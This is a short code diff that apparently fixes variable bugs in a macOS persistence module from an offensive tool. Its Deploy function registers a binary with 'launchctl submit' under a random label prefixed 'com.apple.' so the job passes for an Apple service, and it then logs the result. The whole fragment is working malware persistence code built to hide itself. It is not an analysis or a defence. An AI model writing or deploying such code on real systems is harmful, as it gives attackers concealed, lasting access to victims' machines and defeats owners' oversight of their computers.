@@ -36,7 +36,7 @@ function Deploy() {
     var label = G.rand.GetAlphaString(6);
     label = label.toLowerCase();
     label = "com.apple."+label;
-    exec = G.exec.ExecuteCommand("launchctl", ["submit", "-l", label, "--", name]);
+    var exec = G.exec.ExecuteCommand("launchctl", ["submit", "-l", label, "--", name]);
     if (exec[4] == null) {
         console.log("Persisted binary using launchctl, with the label: "+label);
         console.log("Pid: "+exec[0]);;
@@ -44,7 +44,7 @@ function Deploy() {
         console.log("stderr: "+exec[2]);
         console.log("exit code: "+exec[3]);
     } else {
-        console.log("go errors: "+execResp[4].Error())  ;
+        console.log("go errors: "+exec[4].Error())  ;
     }   
     console.log("Done execution of Launchctl Persistence");
     return true;
